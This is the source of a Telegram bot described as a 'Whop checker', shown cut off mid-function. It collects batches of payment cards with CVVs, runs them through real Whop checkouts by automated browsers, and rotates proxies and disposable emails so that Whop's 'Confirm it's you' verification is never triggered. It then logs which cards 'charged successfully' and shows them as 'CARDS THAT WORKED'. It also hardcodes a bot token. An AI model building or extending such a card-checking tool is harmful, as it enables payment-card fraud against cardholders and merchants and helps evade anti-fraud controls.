"""
telegram_bot.py    Whop checker, Telegram front-end
Commands:
  /start            greeting + buttons (incl. ôè Database)
  /ccs              add up to 50 cards  (num|mm|yyyy|cvv, one per line)
  /proxy            list proxy sources
  /addproxy         add your own proxy  (user:pass@host:port)  tested before saving
  /whop [url]       run the check (asks: system proxies / add own)
  /live             retry the insufficient cards from the last run
  /db               show the database (which cards actually worked on Whop)

State is persisted to db.json (cards, proxies, last run) so it survives
crashes and restarts.
"""

import json
import io
import os
import re
import threading
import time
import requests
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED

import telebot
from telebot import types
import telebot.apihelper as _ah

# raise request timeouts for slow / high-latency links
_ah.READ_TIMEOUT = 120
_ah.CONNECT_TIMEOUT = 90

import whop_bot as W
import final_bot as F

# token from env (Railway) with a fallback (repo is private, so not leaked).
# Prefer setting BOT_TOKEN in Railway env and removing this fallback.
TOKEN = os.environ.get("BOT_TOKEN", "88722621051:AAGNMojy2gWmWTV1Ilhw1-cBGV4Kic38Nww")
bot = telebot.TeleBot(TOKEN, threaded=True)

DB_FILE = "db.json"
_lock = threading.RLock()
_db = None

# ===== persistent data dir (survives restarts from any cwd) =====
_BASE = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(_BASE, "data")
os.makedirs(DATA_DIR, exist_ok=True)
DB_FILE = os.path.join(DATA_DIR, "db.json")

DEFAULT_CHECKOUT = "https://whop.com/checkout/2onbgwXn2utmOapDAl-sTbB-xhGu-BQo9-ppzjRbOKz1Pc/"


# ---------- database ----------
# Per-user isolation: each chat_id gets its OWN cards / proxies / results.
# Only system proxies are shared. This keeps 10+ users from mixing data.
def _default_db():
    return {
        "proxies_system": [],  # list of "user:pass@host:port" strings (global)
        "users": {},           # chat_id -> {ccs, proxies_user, last_run, settings}
    }


def user_db(chat_id):
    """Return (creating if needed) this chat's isolated data bucket."""
    db = get_db()
    uid = str(chat_id)
    u = db["users"].get(uid)
    if u is None:
        u = {"ccs": [], "proxies_user": [], "last_run": [],
             "settings": {"checkout_url": DEFAULT_CHECKOUT}}
        db["users"][uid] = u
        save_db()
    u.setdefault("ccs", [])
    u.setdefault("proxies_user", [])
    u.setdefault("last_run", [])
    u.setdefault("settings", {"checkout_url": DEFAULT_CHECKOUT})
    return u



def _remote_repo():
    """'owner/repo' parsed from `git remote get-url origin` for GH_TOKEN auth
    URL fallbacks; falls back to the known repo."""
    import subprocess
    try:
        r = subprocess.run(["git", "-C", _BASE, "remote", "get-url", "origin"],
                           capture_output=True, text=True, timeout=20)
        u = (r.stdout or "").strip()
        if "github.com/" in u:
            return u.split("github.com/", 1)[1].replace(".git", "").rstrip("/")
    except Exception:
        pass
    return "ayaninza/whop-hitter-bot"


def _restore_db_file():
    """If data/db.json is missing, pull the last backed-up copy from the
    origin 'db-backup' branch so a fresh clone/deploy never loses the card
    library. Uses the machine's cached git credentials or GH_TOKEN."""
    import subprocess
    if os.path.exists(DB_FILE):
        return
    env = dict(os.environ)
    env["GIT_TERMINAL_PROMPT"] = "0"
    try:
        r = subprocess.run(["git", "-C", _BASE, "rev-parse", "--is-inside-work-tree"],
                           capture_output=True, text=True, timeout=20)
        if r.returncode != 0:
            return
        f = subprocess.run(["git", "-C", _BASE, "fetch", "origin", "db-backup"],
                           capture_output=True, text=True, timeout=120, env=env)
        if f.returncode != 0 and os.environ.get("GH_TOKEN"):
            tok = os.environ["GH_TOKEN"]
            auth = f"https://x-access-token:{tok}@github.com/{_remote_repo()}.git"
            f = subprocess.run(["git", "-C", _BASE, "fetch", auth,
                                "db-backup:refs/remotes/origin/db-backup"],
                               capture_output=True, text=True, timeout=120, env=env)
        if f.returncode != 0:
            print("[db] no db-backup branch fetchable yet", flush=True)
            return
        s = subprocess.run(["git", "-C", _BASE, "show",
                            "FETCH_HEAD:data/db.json"],
                           capture_output=True, text=True, timeout=60)
        if s.returncode == 0 and s.stdout:
            os.makedirs(DATA_DIR, exist_ok=True)
            with io.open(DB_FILE, "w", encoding="utf-8") as fh:
                fh.write(s.stdout)
            print("[db] restored data/db.json from db-backup branch", flush=True)
    except Exception as e:
        print(f"[db] restore failed: {e!r}", flush=True)


def load_db():
    global _db
    with _lock:
        if _db is None:
            _restore_db_file()
            # migrate an old cwd-based db.json into the persistent data dir
            legacy = os.path.join(os.getcwd(), "db.json")
            if not os.path.exists(DB_FILE) and os.path.exists(legacy):
                try:
                    os.replace(legacy, DB_FILE)
                    print(f"[db] migrated {legacy} -> {DB_FILE}", flush=True)
                except Exception:
                    pass
            if os.path.exists(DB_FILE):
                try:
                    _db = json.load(io.open(DB_FILE, encoding="utf-8"))
                except Exception:
                    _db = _default_db()
            else:
                _db = _default_db()
            for k, v in _default_db().items():
                _db.setdefault(k, v)
            # merge any NEW system proxies (so a proxy added to whop_bot.py
            # shows up even when this machine already has a saved db)
            for p in W.PROXIES:
                if p not in _db["proxies_system"]:
                    _db["proxies_system"].append(p)
            if not _db["proxies_system"]:
                _db["proxies_system"] = list(W.PROXIES)
                save_db()
    return _db


def save_db():
    with _lock:
        tmp = DB_FILE + ".tmp"
        json.dump(_db, io.open(tmp, "w", encoding="utf-8"), indent=2)
        os.replace(tmp, DB_FILE)


def get_db():
    return _db if _db is not None else load_db()


# ---------- hourly GitHub backup (never lose the card library) ----------
def _backup_library():
    """Commit the data/ folder (db.json + emails) to GitHub and push. Uses the
    machine's cached git credentials, or GH_TOKEN env var as a fallback. Fails
    silently on network issues — the loop retries next hour."""
    import subprocess
    save_db()
    stamp = time.strftime("%Y-%m-%d %H:%M")
    try:
        subprocess.run(["git", "-C", _BASE, "add", "-f", "data"],
                       capture_output=True, text=True, timeout=60)
        staged = subprocess.run(
            ["git", "-C", _BASE, "diff", "--cached", "--quiet", "--", "data"],
            capture_output=True, text=True, timeout=30).returncode
        if staged == 0:
            print("[backup] no changes to commit", flush=True)
            return
        cm = subprocess.run(
            ["git", "-C", _BASE, "commit", "-m", f"auto-backup db ({stamp})",
             "--", "data"],
            capture_output=True, text=True, timeout=60)
        print("[backup] commit:", (cm.stdout + cm.stderr).strip()[-200:], flush=True)
        refspec = "HEAD:refs/heads/db-backup"
        ph = subprocess.run(["git", "-C", _BASE, "push", "origin", refspec],
                            capture_output=True, text=True, timeout=180)
        if ph.returncode != 0 and os.environ.get("GH_TOKEN"):
            tok = os.environ["GH_TOKEN"]
            auth_url = f"https://x-access-token:{tok}@github.com/{_remote_repo()}.git"
            ph = subprocess.run(["git", "-C", _BASE, "push", auth_url, refspec],
                                capture_output=True, text=True, timeout=180)
        if ph.returncode == 0:
            print("[backup] pushed branch db-backup OK", flush=True)
        if ph.returncode == 0:
            print("[backup] pushed to GitHub OK", flush=True)
        else:
            print("[backup] push failed:",
                  (ph.stdout + ph.stderr).strip()[-300:], flush=True)
    except Exception as e:
        print(f"[backup] error: {e!r}", flush=True)


def auto_backup_loop():
    """Background thread: after a short delay, then every hour, save db.json
    and push the data/ folder to GitHub so a restart/wipe can never lose it."""
    minutes = max(5, int(os.environ.get("BACKUP_MINUTES", "60")))
    delay = max(5, float(os.environ.get("BACKUP_DELAY_S", "30")))
    time.sleep(delay)
    while True:
        try:
            _backup_library()
        except Exception as e:
            print(f"[backup loop] {e!r}", flush=True)
        time.sleep(minutes * 60)


def cmd_args(m):
    """Text that follows a command, whether on the same line (after a space)
    or on the following lines. e.g. '/addproxy\\nuser:pass@host:port' works."""
    s = m.text.split(" ", 1)
    if len(s) > 1 and s[1].strip():
        return s[1]
    return "\n".join(m.text.splitlines()[1:])


# ---------- helpers ----------
def parse_ccs(text):
    out = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = re.split(r"[|]", line)
        if len(parts) < 4:
            continue
        num, mm, yyraw, cvc = (p.strip() for p in parts[:4])
        yy = ("20" + yyraw) if len(yyraw) == 2 else yyraw
        out.append({"number": num, "exp_month": mm, "exp_year": yy,
                    "cvc": cvc, "raw": line})
    return out


def proxy_str_to_pw(s):
    s = s.strip()
    if "@" in s:
        auth, hostport = s.rsplit("@", 1)
        user, pw = auth.split(":", 1)
    else:
        hostport, user, pw = s, None, None
    d = {"server": "http://" + hostport}
    if user:
        d["username"], d["password"] = user, pw
    return d


def system_proxies():
    return [proxy_str_to_pw(p) for p in get_db()["proxies_system"]]


def user_proxies(chat_id=None):
    if not chat_id:
        return []
    return [proxy_str_to_pw(p) for p in user_db(chat_id)["proxies_user"]]


def all_proxies(chat_id=None):
    return system_proxies() + user_proxies(chat_id)


def test_proxy(s):
    """Return (ok, detail). Tests reachability of whop.com through the proxy.

    Rejects proxies that need auth (a 407 Proxy-Auth-Required answers, which
    is < 500, so the old check wrongly passed them) or are IP-blocked."""
    pstr = s if "://" in s else "http://" + s
    proxies = {"http": pstr, "https": pstr}
    try:
        r = requests.get("https://whop.com", proxies=proxies, timeout=15,
                         headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code >= 400:
            return False, (f"HTTP {r.status_code}  proxy likely needs auth "
                           f"(add as user:pass@host:port) or your IP isn't allowlisted")
        return True, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:120]


def load_failed(res):
    """True when the browser never got past page-load (goto timeout, form not
    mounted, 'Get access' not found) OR Whop showed the "Confirm it's you" OTP
    gate. Either way NO charge happened, so it is safe to retry that card on a
    FRESH proxy + FRESH email (a new device identity won't get the OTP). We
    deliberately exclude post-submit outcomes (declined / unclear / watchdog)
    where a charge may have already occurred  never retry those."""
    if res.get("status") != "error":
        return False
    r = (res.get("response") or "").lower()
    if "watchdog" in r:
        return False
    markers = ("could not load", "checkout form did not load", "could not click",
               "navigating to", "timeout", "timed out", "exceeded", "goto",
               "proxy connection", "timeouterror",
               "verification required", "confirm its you", "confirm it's you",
               "enter the code", "we sent a code", "saved information",
               "logging in as", "device will be remembered", "verification code")
    return any(m in r for m in markers)


# Email consumption: one real email per checkout try, removed from the list so
# it's never reused (reusing a registered email is what triggers Whop's
# "Confirm it's you" OTP). Invalid/malformed lines are dropped too.
EMAIL_DB = os.environ.get("EMAIL_DB", os.path.join(DATA_DIR, "emails.txt"))
_email_lock = threading.Lock()
_EMAIL_RE = re.compile(r"^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$")
_used_emails = set()


def consume_email():
    """Return the next unused email from EMAIL_DB (removing it + any invalid
    lines from the file, thread-safe). Falls back to a fresh random email if
    the file is missing/empty so the deployed bot still works."""
    with _email_lock:
        chosen = None
        keep = []
        try:
            with open(EMAIL_DB, "r", encoding="utf-8", errors="ignore") as f:
                lines = [ln.strip() for ln in f]
        except Exception:
            lines = []
        for ln in lines:
            if not ln:
                continue
            if chosen is None and _EMAIL_RE.match(ln):
                chosen = ln
            else:
                keep.append(ln)
        if chosen is not None:
            try:
                with open(EMAIL_DB, "w", encoding="utf-8") as f:
                    f.write("\n".join(keep) + ("\n" if keep else ""))
            except Exception:
                pass
    if chosen:
        return chosen
    # file empty/missing -> random fallback (guaranteed unique in-process)
    for _ in range(50):
        e = W.random_email()
        if e not in _used_emails:
            _used_emails.add(e)
            return e
    e = W.random_email()
    _used_emails.add(e)
    return e


def fresh_email():
    return consume_email()


def add_proxies_tested(chat_id, text):
    udb = user_db(chat_id)
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines:
        bot.send_message(chat_id, "⚠️ no proxy provided")
        return 0
    msg = bot.send_message(chat_id, "┌─ 🚀 *TESTING PROXIES*\n── in progress")
    added = 0
    report = []
    for l in lines:
        ok, detail = test_proxy(l)
        if ok:
            with _lock:
                if l not in udb["proxies_user"]:
                    udb["proxies_user"].append(l)
                    added += 1
            report.append(f"├─ ✅ `{l}`  ({detail})")
        else:
            report.append(f"├─  `{l}`   {detail}")
        try:
            bot.edit_message_text("\n".join(report), chat_id, msg.message_id,
                                  parse_mode="Markdown")
        except Exception:
            pass
    save_db()
    try:
        bot.edit_message_text(
            "┌─ 🚀 *PROXY TEST RESULTS*\n" + "\n".join(report) +
            f"\n── ✅ added {added} ┬╖ your total {len(udb['proxies_user'])}",
            chat_id, msg.message_id, parse_mode="Markdown")
    except Exception:
        pass
    return added


def fmt_box(res):
    s = res["status"]
    last4 = res["last4"]
    proxy = (res.get("proxy") or "").replace("http://", "").replace("https://", "")
    email = res.get("email") or "? no email"
    if s == "success":
        head, body = "PAYMENT APPROVED", "Charged Successfully"
        foot = "Access granted - saved to CARDS THAT WORKED."
    elif s == "stopped":
        head, body = "STOPPED", "Checkout aborted by user"
        foot = "No result recorded."
    elif s == "insufficient":
        head, body = "INSUFFICIENT FUNDS", "Not enough balance on this card"
        foot = "Use /live to retry after adding funds."
    elif s == "declined":
        head, body = "CARD DECLINED", "Card declined by issuer"
        foot = "Use a different payment method."
    elif s == "missing":
        head, body = "MISSING / INVALID DETAILS", "Missing or invalid required fields"
        foot = "Verify card details and retry."
    else:  # error
        reason = (res.get("response") or "unknown error").strip().splitlines()[-1][:60]
        head, body = "CHECK FAILED", reason
        foot = "Check logs or retry with /live."
    return ("| " + head + "\n"
            "|\n"
            "| Card ..... : .... " + last4 + "\n"
            "| Email .... : " + email + "\n"
            "| " + body + "\n"
            "| Status ... : " + s.upper() + "\n"
            "| Proxy .... : " + (proxy or "-") + "\n"
            "|\n"
            "| " + foot)


def send_result(chat_id, res):
    box = fmt_box(res)
    shot = res.get("screenshot")
    pin = res["status"] == "success"
    if shot and os.path.exists(shot):
        # Try photo first (renders inline in Telegram), then document as a
        # fallback. We NEVER pipe the screenshot into any vision/LLM model 
        # it is sent straight to the chat so the user sees it.
        try:
            with open(shot, "rb") as ph:
                msg = bot.send_photo(chat_id, ph, caption=box)
            if pin:
                try:
                    bot.pin_chat_message(chat_id, msg.message_id)
                except Exception:
                    pass
            return
        except Exception:
            pass
        try:
            with open(shot, "rb") as ph:
                bot.send_document(chat_id, ph, caption=box)
            return
        except Exception:
            pass
    bot.send_message(chat_id, box)


def record_result(chat_id, cc, res):
    udb = user_db(chat_id)
    with _lock:
        for c in udb["ccs"]:
            if c.get("raw") == cc.get("raw"):
                c["status"] = res.get("status", "")
                c["response"] = (res.get("response") or "")[:500]
                c["proxy"] = res.get("proxy", "")
                c["email"] = res.get("email", "")
                c["ts"] = time.time()
                c["live"] = (res.get("status") == "success")
                break
        udb["last_run"].append({
            "raw": cc.get("raw"), "status": res.get("status", ""),
            "proxy": res.get("proxy", ""), "email": res.get("email", ""),
            "response": (res.get("response") or "")[:300],
        })
        save_db()


# ---------- the check run ----------
def run_check(chat_id, url, proxy_list, ccs, db_key=None):
    """Run the /whop checkout flow per card, sequentially, sending a
    per-card result + screenshot to the chat as each finishes. Mirrors the
    proven /ref worker (direct W.run_checkout per card, proxy rotation by
    index, ABORT support, live status messages) so /whop always replies."""
    n = len(ccs)
    ABORT.pop(chat_id, None)
    if ccs and not proxy_list:
        bot.send_message(chat_id,
                         f"{'\u251c\u2500'} {'\u26a0\ufe0f'} No proxies available\n"
                         f"{'\u2502'} send /proxy to configure",
                         parse_mode="Markdown")
        return
    head = (f"{'\u250c\u2500'}{'\u2502'} {'\U0001f680'} *RUN STARTED*\n"
            f"{'\u2502'} {'\U0001f310'} *CHECKOUT URL*: {url}\n"
            f"{'\u2502'} {'\U0001f4b3'} cards   : {n}\n"
            f"{'\u2502'} {'\u26a1'} workers : 1\n"
            f"{'\u2514\u2500'}{'\u2502'} {'\u25a0'} progress ~\n")
    m = bot.send_message(chat_id, head, parse_mode="Markdown")
    last = [0.0]
    def refresh(done, current=None, force=False):
        import time as _t
        if not force and (_t.time() - last[0]) < 2.0:
            return
        last[0] = _t.time()
        txt = (f"{'\u250c\u2500'}{'\u2502'} {'\U0001f680'} *RUN STARTED*\n"
               f"{'\u2502'} {'\U0001f310'} *CHECKOUT URL*: {url}\n"
               f"{'\u2502'} {'\U0001f4b3'} cards   : {n}\n"
               f"{'\u2502'} {'\u26a1'} workers : 1\n"
               f"{'\u251c\u2500'}{'\u2502'} {'\u25a0'} progress ~\n")
        for cc in ccs:
            st = cc.get('status', '') or 'waiting'
            mark = {'success': '\u2713', 'live': '\U0001f7e2',
                    'insufficient': '\u26a0\ufe0f', 'declined': '\u2716',
                    'missing': '\u2757', 'stopped': '\u23f9',
                    'error': '\U0001f4a5'}.get(st, '\u23f3')
            txt += f"{'\u2502'} {mark} {cc.get('raw','')} - {cc.get('response','')}\n"
        if current:
            txt += f"{'\u251c\u2500'}{'\u2502'} {'\u26a1'} checking {current.get('raw','')}\n"
        txt += f"{'\u2514\u2500'}{'\u2502'} {done}/{n} done"
        try:
            bot.edit_message_text(txt, chat_id, m.message_id, parse_mode="Markdown")
        except Exception:
            pass
    import time
    done = 0
    for idx, cc in enumerate(ccs):
        refresh(done, cc)
        if ABORT.get(chat_id):
            cc['status'] = 'stopped'
            cc['response'] = 'Stopped by user'
            bot.send_message(chat_id,
                             f"{'\u251c\u2500'} {'\u23f9'} *ABORTED*\n{'\u2502'} stopped by user",
                             parse_mode="Markdown")
            break
        if not proxy_list:
            cc['status'] = 'error'
            cc['response'] = 'no proxies'
            continue
        npx = len(proxy_list)
        res = None
        for k in range(npx):
            if ABORT.get(chat_id):
                cc['status'] = 'stopped'
                cc['response'] = 'Stopped by user'
                break
            px = proxy_list[(idx + k) % npx]
            em = fresh_email()
            tag = 'w' + str(cc.get('number', ''))[-4:]
            try:
                res = W.run_checkout(url, cc, proxy=px, headless=True,
                                     tag=tag, email=em)
            except Exception as e:
                res = {'status': 'error', 'response': str(e)[:200],
                       'screenshot': None, 'proxy': px, 'email': em}
            st = (res or {}).get('status', 'error')
            if st in ('live', 'success', 'declined', 'insufficient',
                      'missing', 'stopped', 'error', 'fetched'):
                cc.update({'status': st,
                           'live': (st == 'live'),
                           'response': (res or {}).get('response', ''),
                           'proxy': px, 'email': em, 'ts': int(time.time())})
                break
            cc['response'] = (res or {}).get('response', '')
        else:
            cc['status'] = 'error'
            cc['response'] = 'all proxies failed'
            cc['ts'] = int(time.time())
        done += 1
        refresh(done, force=True)
        send_result(chat_id, cc)
        if ABORT.get(chat_id):
            break
    refresh(done, force=True)
def run_ref_flow(chat_id, ccs, proxy_list):
    """Run the buy-vip checkout flow (final_bot) for each card, sequentially,
    sending a result + screenshot to the chat as each finishes."""
    n = len(ccs)
    udb = user_db(chat_id)
    checkout_url = udb["settings"].get("checkout_url")
    icon = {"success": "✓", "stopped": "⏹", "insufficient": "⚠️",
            "declined": "✖", "missing": "❗", "error": "💥"}
    ABORT.pop(chat_id, None)   # fresh run: clear any stale stop flag
    kb_stop = types.InlineKeyboardMarkup()
    kb_stop.add(types.InlineKeyboardButton("¢æ Stop", callback_data="stop"))

    status_msg = bot.send_message(
        chat_id,
        f"┌─ ÜÇ *REF RUN STARTED* (buy-vip)\n"
        f"│\n"
        f"├─ 💳 cards    : {n}\n"
        f"├─ îÉ proxies  : {len(proxy_list)}\n"
        f"── progress 0/{n} ",
        parse_mode="Markdown", reply_markup=kb_stop)

    def refresh(done, current=None):
        head = (f"┌─ ÜÇ *REF RUN IN PROGRESS* (buy-vip)\n"
                f"│\n"
                f"├─ 💳 cards    : {n}\n"
                f"├─ îÉ proxies  : {len(proxy_list)}\n"
                f"── progress {done}/{n}\n\n")
        body = ""
        if current:
            body += f" ref `{current}` "
        try:
            bot.edit_message_text(head + body, chat_id, status_msg.message_id,
                                  parse_mode="Markdown", reply_markup=kb_stop)
        except Exception:
            pass

    results = []
    lines = []
    refresh(0)
    em = ""
    for i, cc in enumerate(ccs, 1):
        if ABORT.get(chat_id):
            print(f"ABORT(ref): stopping at {i}/{n}", flush=True)
            break
        refresh(i - 1, current=cc["number"][-4:])

        # Rotate proxies on load-failure: the heavy buy-vip page often won't
        # load through a slow/datacenter proxy, but another one will. Only
        # retry when the browser never reached the form (no charge occurred).
        npx = len(proxy_list)
        start = (i - 1) % npx if npx else 0
        res = None
        for k in range(npx if npx else 1):
            if ABORT.get(chat_id):
                print(f"ABORT(ref): stopping inside card {i}", flush=True)
                break
            px = proxy_list[(start + k) % npx] if npx else None
            em = fresh_email()   # new email + new proxy each attempt avoids OTP
            try:
                with BROWSER_SEM:
                    res = F.run_final(cc_override=cc, proxy=px, headless=True,
                                      submit=True, tag=f"ref_{cc['number'][-4:]}",
                                      email=em, checkout_url=checkout_url,
                                      direct=True,
                                      should_stop=lambda: ABORT.get(chat_id))
            except Exception as e:
                import traceback as _tb
                _tb_text = _tb.format_exc()
                print("REF WORKER ERROR:", _tb_text, flush=True)
                res = {"cc": cc["number"], "last4": cc["number"][-4:],
                       "status": "error", "response": _tb_text,
                       "screenshot": None, "proxy": (px or {}).get("server"),
                       "email": em}
            if ABORT.get(chat_id):
                print(f"ABORT(ref): card {i} aborted mid-checkout", flush=True)
                res = {"cc": cc["number"], "last4": cc["number"][-4:],
                       "status": "stopped", "response": "Stopped by user",
                       "screenshot": None, "proxy": (px or {}).get("server"),
                       "email": em}
                break
            if not load_failed(res):
                break
            print(f"ref {cc['number'][-4:]}: load failed on "
                  f"{(px or {}).get('server')}, trying next proxy", flush=True)
        if res is None:
            res = {"cc": cc["number"], "last4": cc["number"][-4:],
                   "status": "stopped", "response": "Stopped by user",
                   "screenshot": None, "proxy": "", "email": ""}
        record_result(chat_id, cc, res)
        send_result(chat_id, res)
        results.append((cc, res))
        lines.append(f"{icon.get(res['status'],'∩╕Å')} `{res['last4']}` "
                     f"{res['status'].upper()}")
        refresh(i)

    hits = sum(1 for _, r in results if r["status"] == "success")
    ins = sum(1 for _, r in results if r["status"] == "insufficient")
    dec = sum(1 for _, r in results if r["status"] == "declined")
    err = sum(1 for _, r in results if r["status"] == "error")
    lines.append("")
    lines.append(f"∑ ✓ {hits} live · ⚠️ {ins} insufficient · ✖ {dec} declined · "
                 f"💥 {err} error")
    if ABORT.get(chat_id):
        lines.append("⏹ stopped by user")
    refresh(n, stop=False)
    ABORT.pop(chat_id, None)


# ---------- database view ----------
def build_db_text(chat_id):
    udb = user_db(chat_id)
    ccs = udb["ccs"]
    total = len(ccs)
    live = [c for c in ccs if c.get("live")]
    ins = [c for c in ccs if c.get("status") == "insufficient"]
    dec = [c for c in ccs if c.get("status") == "declined"]
    other = [c for c in ccs if c.get("status") in ("missing", "error")]
    pend = [c for c in ccs if not c.get("status")]

    t = "┌─ ôè *DATABASE*\n"
    t += "│\n"
    t += f"├─ 💳 cards total    : {total}\n"
    t += f"├─ ✅ live (worked)  : {len(live)}\n"
    t += f"├─ ⚠️ insufficient    : {len(ins)}\n"
    t += f"├─ Ü½ declined       : {len(dec)}\n"
    t += f"├─ ÆÑ other / error  : {len(other)}\n"
    t += f"──  pending        : {len(pend)}\n\n"

    if live:
        t += "✅ *CARDS THAT WORKED ON WHOP:*\n"
        for c in live[:50]:
            t += f"  `{c['number'][-4:]}`  {c.get('raw','')}"
            em = c.get("email") or ""
            if em:
                t += f"\n    ôº {em}"
            t += "\n"
        if len(live) > 50:
            t += f"  and {len(live)-50} more\n"
    else:
        t += "✅ no working cards yet\n"

    t += (f"\n⏹ proxies  system {len(get_db()['proxies_system'])} ┬╖ "
           f"your {len(udb['proxies_user'])} (tested OK)")
    return t


def send_db(chat_id, message_id=None):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="m_db"))
    text = build_db_text(chat_id)
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id,
                                  parse_mode="Markdown", reply_markup=kb)
            return
        except Exception:
            pass
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=kb)


# ---------- handlers ----------
@bot.message_handler(commands=["start"])
def cmd_start(m):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("ôè Database", callback_data="m_db"))
    kb.add(types.InlineKeyboardButton("⚙ Add Proxy", callback_data="m_addp"),
           types.InlineKeyboardButton("⏹ Proxies", callback_data="m_prox"))
    kb.add(types.InlineKeyboardButton("∩╕Å Run /whop", callback_data="m_whop"))
    bot.send_message(
        m.chat.id,
        "┌─ ⏹ *WHOP CHECKER*\n"
        "│\n"
        "├─ 💳 checks cards via Whop checkout\n"
        "├─ îÉ rotates proxies + fingerprints\n"
        "├─ ôè db auto-saved (survives restarts)\n"
        "│\n"
        "├─ /ccs      add cards (max 50)\n"
        "├─ /whop     run check on a url\n"
        "├─ /ref      buy-vip flow (click Get access + fill + screenshot)\n"
        "├─ /proxy    list proxies\n"
        "├─ /addproxy add + test your proxy\n"
        "├─ /live     retry insufficient\n"
        "├─ /clear    wipe saved cards\n"
        "── /db       view database",
        parse_mode="Markdown", reply_markup=kb)


@bot.message_handler(commands=["ccs"])
def cmd_ccs(m):
    text = cmd_args(m)
    if not text.strip():
        bot.send_message(m.chat.id,
                         "? send: /ccs then cards one per line\n`num|mm|yyyy|cvv`",
                         parse_mode="Markdown")
        return
    new = parse_ccs(text)
    if not new:
        bot.send_message(m.chat.id,
                         "⚠️ no valid cards (need `num|mm|yyyy|cvv`)",
                         parse_mode="Markdown")
        return
    udb = user_db(m.chat.id)
    existing = {c.get("raw") for c in udb["ccs"]}
    room = 50 - len(udb["ccs"])
    if room <= 0:
        bot.send_message(m.chat.id, "⚠️ limit 50 reached")
        return
    skipped = 0
    added = 0
    for c in new:
        if c["raw"] in existing:
            skipped += 1
            continue
        if room <= 0:
            break
        c.update({"status": "", "live": False, "response": "", "proxy": "", "ts": 0})
        udb["ccs"].append(c)
        existing.add(c["raw"])
        room -= 1
        added += 1
    save_db()
    note = f"\n── ⚠️ {skipped} duplicate(s) skipped" if skipped else ""
    bot.send_message(m.chat.id,
                     f"┌─ 💳 *CARDS ADDED*\n"
                     f"├─ ✅ added  : {added}\n"
                     f"── ôè total  : {len(udb['ccs'])}/50{note}",
                     parse_mode="Markdown")


@bot.message_handler(commands=["clear"])
def cmd_clear(m):
    udb = user_db(m.chat.id)
    n = len(udb["ccs"])
    udb["ccs"] = []
    save_db()
    bot.send_message(m.chat.id,
                     f"┌─ º╣ *CARDS CLEARED*\n"
                     f"── removed {n} card(s) ┬╖ add again with /ccs or /whop",
                     parse_mode="Markdown")


@bot.message_handler(commands=["proxy"])
def cmd_proxy(m):
    udb = user_db(m.chat.id)
    bot.send_message(
        m.chat.id,
        f"┌─ ⏹ *PROXIES*\n"
        f"├─ ûÑ∩╕Å system : {len(get_db()['proxies_system'])}\n"
        f"── æñ your   : {len(udb['proxies_user'])} (all tested OK)\n\n"
        f"use /addproxy to append more",
        parse_mode="Markdown")


@bot.message_handler(commands=["addproxy"])
def cmd_addproxy(m):
    text = cmd_args(m)
    if not text.strip():
        bot.send_message(m.chat.id, "? /addproxy `user:pass@host:port`",
                         parse_mode="Markdown")
        return
    _start_light(m.chat.id, add_proxies_tested, m.chat.id, text)


@bot.message_handler(commands=["whop"])
def cmd_whop(m):
    body = cmd_args(m)
    blines = body.splitlines()
    url_line = next((l.strip() for l in blines if l.strip().startswith("http")), None)
    if not url_line:
        bot.send_message(m.chat.id, "\u26a0\ufe0f /whop `<checkout url>`\n\n_usage: /whop <url> [card1] [card2] ...\n_use /ccs to manage saved cards.",
                         parse_mode="Markdown")
        return
    url = url_line
    udb = user_db(m.chat.id)
    # allow pasting cards on the following lines, e.g.
    #   /whop <url>
    #   5328398287077228|05|2029|211
    card_text = "\n".join(l for l in blines if not l.strip().startswith("http"))
    added = 0
    skipped = 0
    if card_text.strip():
        existing = {c.get("raw") for c in udb["ccs"]}
        new = parse_ccs(card_text)
        room = 50 - len(udb["ccs"])
        for c in new:
            if c["raw"] in existing:
                skipped += 1
                continue
            if room <= 0:
                break
            c.update({"status": "", "live": False, "response": "",
                      "proxy": "", "ts": 0})
            udb["ccs"].append(c)
            existing.add(c["raw"])
            room -= 1
            added += 1
    udb["settings"]["checkout_url"] = url
    save_db()
    PENDING[m.chat.id] = url
    # run ONLY the card(s) pasted with this /whop, not the whole saved db
    PENDING_CARDS[m.chat.id] = new if card_text.strip() else []
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("⏹ System Proxies", callback_data="px_sys"))
    kb.add(types.InlineKeyboardButton("⚙ Use My Proxies", callback_data="px_add"))
    card_note = ""
    if added:
        card_note += f"├─ ✅ added {added} card(s)\n"
    if skipped:
        card_note += f"├─ ⚠️ {skipped} dup skipped\n"
    bot.send_message(m.chat.id,
                     f"┌─ 💳 *CHECKOUT READY*\n"
                     f"│\n"
                     f"{card_note}"
                     f"── choose a proxy source æç",
                     parse_mode="Markdown",
                     reply_markup=kb)


@bot.message_handler(commands=["ref"])
def cmd_ref(m):
    body = cmd_args(m)
    blines = body.splitlines()
    udb = user_db(m.chat.id)
    # Extract URL if user pasted one (like /whop does)
    url_line = next((l.strip() for l in blines if l.strip().startswith("http")), None)
    if url_line:
        udb["settings"]["checkout_url"] = url_line
        save_db()
    card_text = "\n".join(l for l in blines if not l.strip().startswith("http"))
    udb = user_db(m.chat.id)
    target = []
    added = 0
    skipped = 0
    if card_text.strip():
        existing = {c.get("raw") for c in udb["ccs"]}
        new = parse_ccs(card_text)
        room = 50 - len(udb["ccs"])
        for c in new:
            if c["raw"] in existing:
                skipped += 1
                continue
            if room <= 0:
                break
            c.update({"status": "", "live": False, "response": "",
                      "proxy": "", "ts": 0})
            udb["ccs"].append(c)
            existing.add(c["raw"])
            room -= 1
            added += 1
        target = new
        save_db()
    else:
        target = udb["ccs"]
    if not target:
        bot.send_message(m.chat.id,
                         "⚠️ no cards. add with /ccs or paste with /ref\n"
                         "`/ref` then cards one per line: num|mm|yyyy|cvv",
                         parse_mode="Markdown")
        return
    note = ""
    if added:
        note += f"├─ ✅ added {added} card(s)\n"
    if skipped:
        note += f"├─ ⚠️ {skipped} dup skipped\n"
    # store target and ask for a proxy source (system vs your own added proxies)
